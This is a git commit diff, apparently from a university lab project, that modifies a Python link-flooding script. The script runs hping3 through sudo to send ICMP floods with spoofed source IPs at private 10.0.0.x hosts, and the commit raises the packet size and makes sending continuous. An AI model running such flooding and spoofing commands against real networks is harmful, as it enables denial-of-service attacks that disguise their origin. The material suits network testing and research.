f95d0d4c898a0ad7953a32b9d52092c8487cbfba
Ante Skoric <ante.skoric@haw-hamburg.de>
2020-12-07 13:28:23 +0100

    Changed the link flooding script

--- link_flooding_two.py
+++ link_flooding_two.py
@@ -4,7 +4,7 @@ import os
 # The link can process so much packages and is therefore not down
 
 packages = "20"
-data_size = "120"
+data_size = "480"
 dest_ips_left = ["10.0.0.1", "10.0.0.2", "10.0.0.6", "10.0.0.8", "10.0.0.42"]
 dest_ips_right = ["10.0.0.3", "10.0.0.4", "10.0.0.5"]
 sudoPassword = ''
@@ -14,4 +14,4 @@ for i in range(0, len(dest_ips_right) - 1):
     dest_ip = dest_ips_left[i]
     sourc_ip = dest_ips_right[i]
     os.system('echo %s|sudo -S %s' % (
-    sudoPassword, "hping3 --flood -c " + packages + " -1 -p 7 " + "-d " + data_size + " -a " + sourc_ip + " " + dest_ip))
+    sudoPassword, "hping3 --fast " + " -1 -p 7 " + "-d " + data_size + " -a " + sourc_ip + " " + dest_ip))
